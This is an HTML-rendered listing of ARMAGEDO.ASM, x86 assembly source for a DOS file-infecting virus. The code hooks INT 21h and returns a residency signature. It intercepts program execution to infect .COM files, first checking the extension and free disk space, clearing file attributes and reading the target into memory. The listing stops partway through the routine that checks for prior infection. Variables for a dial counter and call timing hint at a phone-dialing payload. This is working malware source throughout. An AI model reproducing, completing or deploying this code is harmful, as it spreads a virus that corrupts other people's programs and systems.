<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>ARMAGEDO.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc5">dta</span><span class="sc0">                     </span><span class="sc9">equ</span><span class="sc0">         </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">last_byte</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">virlen</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">         </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">last_byte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">strlen</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">         </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endstr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">startstr</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0">                    </span><span class="sc9">segment</span><span class="sc0">
                            </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">
                            </span><span class="sc9">org</span><span class="sc0">         </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc5">main</span><span class="sc0">

</span><span class="sc5">newint21</span><span class="sc0">            </span><span class="sc9">proc</span><span class="sc0">        </span><span class="sc10">far</span><span class="sc0">                                     </span><span class="sc1">; SETS THE 'INT 21h' VIRUSED</span><span class="sc0">
                            </span><span class="sc6">pushf</span><span class="sc0">                                               </span><span class="sc1">; Save flags for compare     </span><span class="sc0">
                      </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0e0h</span><span class="sc0">               </span><span class="sc1">; Is it exist-test?      </span><span class="sc0">
                      </span><span class="sc6">jnz</span><span class="sc0">       </span><span class="sc5">notest1</span><span class="sc0">               </span><span class="sc1">; if not go on   </span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0dadah</span><span class="sc0">             </span><span class="sc1">; else return signature,</span><span class="sc0">
                    </span><span class="sc6">popf</span><span class="sc0">                                                    </span><span class="sc1">; restore flag and</span><span class="sc0">
                            </span><span class="sc6">iret</span><span class="sc0">                            </span><span class="sc1">; return to program</span><span class="sc0">
</span><span class="sc5">notest1</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0e1h</span><span class="sc0">
                            </span><span class="sc6">jnz</span><span class="sc0">         </span><span class="sc5">notest2</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
                            </span><span class="sc6">popf</span><span class="sc0">
                            </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">notest2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">              </span><span class="sc1">; is 'EXEC' command?</span><span class="sc0">
                            </span><span class="sc6">jz</span><span class="sc0">          </span><span class="sc5">infector</span><span class="sc0">                            </span><span class="sc1">; if yes go to 'infection'</span><span class="sc0">
</span><span class="sc5">do_oldint</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">popf</span><span class="sc0">                          </span><span class="sc1">; restore flags        </span><span class="sc0">
                    </span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">oldint21a</span><span class="sc1">; jump to normal INT 21h</span><span class="sc0">
</span><span class="sc5">newint21</span><span class="sc0">            </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">oldint21a</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">          </span><span class="sc10">?</span><span class="sc0">                                           </span><span class="sc1">; old INT 21h vector (low)</span><span class="sc0">
</span><span class="sc5">oldint21b</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">          </span><span class="sc10">?</span><span class="sc0">                                           </span><span class="sc1">; old INT 21h vector (high)</span><span class="sc0">
</span><span class="sc5">oldint8a</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">          </span><span class="sc10">?</span><span class="sc0">                                           </span><span class="sc1">; old INT 8 vector (low)</span><span class="sc0">
</span><span class="sc5">oldint8b</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">          </span><span class="sc10">?</span><span class="sc0">                                           </span><span class="sc1">; old INT 8 vector (high)</span><span class="sc0">
</span><span class="sc5">status</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">          </span><span class="sc2">0</span><span class="sc0">                                           </span><span class="sc1">; flag for time (call in progress)</span><span class="sc0">
</span><span class="sc5">ticks</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0">          </span><span class="sc2">0</span><span class="sc0">                                           </span><span class="sc1">; 18.2 tick counter</span><span class="sc0">
</span><span class="sc5">cur_h</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0">          </span><span class="sc2">0</span><span class="sc0">                                           </span><span class="sc1">; Current time (HOURS)</span><span class="sc0">
</span><span class="sc5">cur_m</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0">          </span><span class="sc2">0</span><span class="sc0">                                           </span><span class="sc1">; Current time (MINUTES)</span><span class="sc0">
</span><span class="sc5">cur_s</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0">          </span><span class="sc2">0</span><span class="sc0">                                           </span><span class="sc1">; Current time (SECONDS)</span><span class="sc0">
</span><span class="sc5">count</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">          </span><span class="sc2">0</span><span class="sc0">                                           </span><span class="sc1">; dial counter (30 sec, 540 ticks)</span><span class="sc0">
</span><span class="sc5">garbidge</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">          </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">stringpos</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">          </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">call_made</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">          </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">init_done</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">          </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">comext</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">          </span><span class="sc12">'COM'</span><span class="sc0">                                   </span><span class="sc1">; Valid inf. extension</span><span class="sc0">
</span><span class="sc5">handle</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">          </span><span class="sc10">?</span><span class="sc0">                                           </span><span class="sc1">; inf. handle number</span><span class="sc0">
</span><span class="sc5">filesize</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">          </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc5">prseg</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">          </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">seg_buffer</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">          </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ss_reg</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">          </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sp_reg</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">          </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">fileds</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">          </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">filedx</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">          </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">attr</span><span class="sc0">                    </span><span class="sc9">dw</span><span class="sc0">          </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">filedate</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">          </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">filetime</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">          </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">env_seg</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">          </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">cdline_offs</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">          </span><span class="sc2">81h</span><span class="sc0">
</span><span class="sc5">cdline_seg</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">          </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">fcb1_offs</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">          </span><span class="sc2">5ch</span><span class="sc0">
</span><span class="sc5">fcb1_seg</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">          </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">fcb2_offs</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">          </span><span class="sc2">6ch</span><span class="sc0">
</span><span class="sc5">fcb2_seg</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">          </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">infector</span><span class="sc0">            </span><span class="sc9">proc</span><span class="sc0">        </span><span class="sc10">near</span><span class="sc0">                                    </span><span class="sc1">; PROGRAM INFECTOR</span><span class="sc0">
                            </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ds</span><span class="sc0">                                      </span><span class="sc1">; save registers to</span><span class="sc0">
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">bx</span><span class="sc0">                                      </span><span class="sc1">; insure normal operation</span><span class="sc0">
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">si</span><span class="sc0">                                      </span><span class="sc1">; by the INT 21h (ah=4b00h)</span><span class="sc0">
                          </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">                                      </span><span class="sc1">; </span><span class="sc0">
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ax</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
                          </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">bp</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">es</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">di</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">

                            </span><span class="sc6">cld</span><span class="sc0">                                                     </span><span class="sc1">; Reset direction to increament</span><span class="sc0">
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">dx</span><span class="sc0">                                      </span><span class="sc1">; Store the address of the</span><span class="sc0">
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ds</span><span class="sc0">                                      </span><span class="sc1">; filespec (DS:DX)</span><span class="sc0">
                            </span><span class="sc6">xor</span><span class="sc0">         </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                                   </span><span class="sc1">; reset counter</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                   </span><span class="sc1">; set ptr to filespec</span><span class="sc0">
</span><span class="sc5">nxtchr</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; take a char</span><span class="sc0">
                            </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">; is it zero?</span><span class="sc0">
                            </span><span class="sc6">jz</span><span class="sc0">          </span><span class="sc5">okay</span><span class="sc0">                                    </span><span class="sc1">; if yes goto okay</span><span class="sc0">
                            </span><span class="sc6">inc</span><span class="sc0">         </span><span class="sc8">cx</span><span class="sc0">                                      </span><span class="sc1">; else increase counter</span><span class="sc0">
                            </span><span class="sc6">inc</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc0">                                      </span><span class="sc1">; and pointer</span><span class="sc0">
                            </span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc5">nxtchr</span><span class="sc0">                              </span><span class="sc1">; take the next chr if CX&gt;0</span><span class="sc0">
</span><span class="sc5">okay</span><span class="sc4">:</span><span class="sc0">
                            </span><span class="sc6">add</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                                   </span><span class="sc1">; Point to end of filespec</span><span class="sc0">
                            </span><span class="sc6">sub</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                                    </span><span class="sc1">; point to .EXT</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">comext</span><span class="sc0">            </span><span class="sc1">; Check if it is a</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                   </span><span class="sc1">; .COM file</span><span class="sc0">
                            </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'N'</span><span class="sc1">; </span><span class="sc0">
                            </span><span class="sc6">jnz</span><span class="sc0">         </span><span class="sc5">ok_1</span><span class="sc0">                                    </span><span class="sc1">; Is it a ND. ?</span><span class="sc0">
                            </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'D'</span><span class="sc1">; if yes exit!</span><span class="sc0">
                            </span><span class="sc6">jz</span><span class="sc0">          </span><span class="sc5">nmatch</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ok_1</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                                    </span><span class="sc1">; checking counter in 3</span><span class="sc0">
</span><span class="sc5">cmp_loop</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;   take 1st ptr's chr</span><span class="sc0">
                            </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;   and compare it with filespec</span><span class="sc0">
                            </span><span class="sc6">jnz</span><span class="sc0">         </span><span class="sc5">nmatch</span><span class="sc0">                              </span><span class="sc1">; If no matching, exit</span><span class="sc0">
                            </span><span class="sc6">inc</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc0">                                      </span><span class="sc1">; else increase 1st ptr</span><span class="sc0">
                            </span><span class="sc6">inc</span><span class="sc0">         </span><span class="sc8">di</span><span class="sc0">                                      </span><span class="sc1">; and second ptr</span><span class="sc0">
                            </span><span class="sc6">loop</span><span class="sc0">        </span><span class="sc5">cmp_loop</span><span class="sc0">                            </span><span class="sc1">; take next compare if CX&gt;0</span><span class="sc0">

                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">ds</span><span class="sc0">                                      </span><span class="sc1">;   restore ds and dx to point</span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc0">                                      </span><span class="sc1">; </span><span class="sc0">
                            
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">dx</span><span class="sc0">                                      </span><span class="sc1">; Store pointer</span><span class="sc0">
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ds</span><span class="sc0">                                      </span><span class="sc1">;                   </span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                   </span><span class="sc1">; Check if filespec </span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">; contains a drive</span><span class="sc0">
                            </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">':'</span><span class="sc1">; letter</span><span class="sc0">
                            </span><span class="sc6">jnz</span><span class="sc0">         </span><span class="sc5">nodrive</span><span class="sc0">                             </span><span class="sc1">; If no jump to nodrive spec.</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; else take the drive in DL</span><span class="sc0">
                            </span><span class="sc6">and</span><span class="sc0">         </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">                              </span><span class="sc1">; and modify for int 21h (ah=36h)</span><span class="sc0">
</span><span class="sc5">nodrive</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">36h</span><span class="sc0">                              </span><span class="sc1">; Take free disk space of DL disk </span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">                                     </span><span class="sc1">; Do the call</span><span class="sc0">
                            </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">                           </span><span class="sc1">; Was an invalid drive specified?</span><span class="sc0">
                            </span><span class="sc6">jz</span><span class="sc0">          </span><span class="sc5">nmatch</span><span class="sc0">                              </span><span class="sc1">; if yes, exit</span><span class="sc0">
                            </span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc5">bypass</span><span class="sc0">                              </span><span class="sc1">; Correct jx 127 limit</span><span class="sc0">

</span><span class="sc5">nmatch</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc5">nomatch</span><span class="sc0">
</span><span class="sc6">invd</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc5">invdrive</span><span class="sc0">
</span><span class="sc5">closeit1</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc5">closeit</span><span class="sc0">
</span><span class="sc5">resdta1</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc5">resdta</span><span class="sc0">

</span><span class="sc5">bypass</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                                    </span><span class="sc1">; Are there at least 3 clust. free?</span><span class="sc0">
                            </span><span class="sc6">jb</span><span class="sc0">          </span><span class="sc5">nmatch</span><span class="sc0">                              </span><span class="sc1">; If no, exit</span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">ds</span><span class="sc0">                                      </span><span class="sc1">; restore pointers</span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">

                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ds</span><span class="sc0">                                      </span><span class="sc1">; and allocate memory</span><span class="sc0">
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">dx</span><span class="sc0">                                      </span><span class="sc1">; for the infection</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">fileds</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">filedx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">                            </span><span class="sc1">; code for Get Attr</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">attr</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
                            </span><span class="sc6">xor</span><span class="sc0">         </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">

                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_buffer</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">dta</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">
    
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">ds</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                            </span><span class="sc1">; DosFn OPEN FILE (R/W)</span><span class="sc0">
                            </span><span class="sc6">clc</span><span class="sc0">                                                     </span><span class="sc1">; Clear carry flag</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">                                     </span><span class="sc1">; Do open</span><span class="sc0">
                            </span><span class="sc6">jc</span><span class="sc0">          </span><span class="sc5">closeit1</span><span class="sc0">                            </span><span class="sc1">; If Error exit</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                                   </span><span class="sc1">; Handle to BX</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">handle</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">; save handle</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">                           </span><span class="sc1">; Bytes to read</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_buffer</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">virlen</span><span class="sc0">                           </span><span class="sc1">; DS:DX points to buffer</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                              </span><span class="sc1">; DosFn READ FROM FILE</span><span class="sc0">
                            </span><span class="sc6">clc</span><span class="sc0">                                                     </span><span class="sc1">; clear carry flag</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">                                     </span><span class="sc1">; Do the call</span><span class="sc0">
                            </span><span class="sc6">jc</span><span class="sc0">          </span><span class="sc5">closeit1</span><span class="sc0">                            </span><span class="sc1">; if error exit</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">filesize</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; Num of bytes actually read</span><span class="sc0">
                                </span><span class="sc1">;cmp            ax,0e000h                           ; max com size to infect</span><span class="sc0">
                                </span><span class="sc1">;ja         closeit1                            ; if size&gt;max exit </span><span class="sc0">
                            </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">virlen</span><span class="sc0">                           </span><span class="sc1">; if filesize is less than the</span><span class="sc0">
                            </span><span class="sc6">jb</span><span class="sc0">          </span><span class="sc5">virit</span><span class="sc0">                                   </span><span class="sc1">; virus size then it is clean</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">virlen</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">                     </span><span class="sc1">; Set 1st ptr to START of file</span><span class="sc0">
                            </span><span class="sc6">add</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                                   </span><span class="sc1">; add 1st ptr the length of file</span><span class="sc0">
                            </span><span class="sc6">sub</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">21</span><span class="sc0">                                   </span><span class="sc1">; and subtract 12 to point to sig.</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">19</span><span class="sc0">                                   </span><span class="sc1">; set the test loop to 10 bytes </span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">signature</span><span class="sc0">     </span><span class="sc1">; Set 2nd ptr to constant signature</span><span class="sc0">
